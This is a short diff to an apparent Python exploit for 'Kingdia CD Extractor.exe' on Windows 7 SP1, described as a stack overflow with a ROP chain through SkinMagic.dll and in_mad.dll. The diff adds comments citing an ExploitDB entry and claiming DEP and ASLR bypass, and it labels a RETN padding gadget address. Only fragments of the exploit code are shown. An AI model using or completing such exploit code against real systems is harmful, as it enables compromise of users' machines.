@@ -2,6 +2,13 @@
 # Target binary: 'Kingdia CD Extractor.exe'
 # Target system: Windows 7 SP1
 # Stack Overflow + ROP Chain --> SkinMagic.dll, in_mad.dll
+# ExploitDB page: https://www.exploit-db.com/exploits/50470
+
+# Please note that the exploit code on ExploitDB is related
+# to Kingdia CD Extractor version 3.2.0. It seems that the
+# vulnerability affects this version too. In addition, this
+# version implements a rop chain to bypass Data Execution
+# Prevention and Address Space Layout Randomization.
 
 from struct import pack
 
@@ -48,7 +55,7 @@ def generate_rop():
     gadgets = [
 
         # padding
-        0x1003A015,
+        0x1003A015, # RETN --> SkinMagic.dll
         0x1003A015,
         0x1003A015,
         0x1003A015,
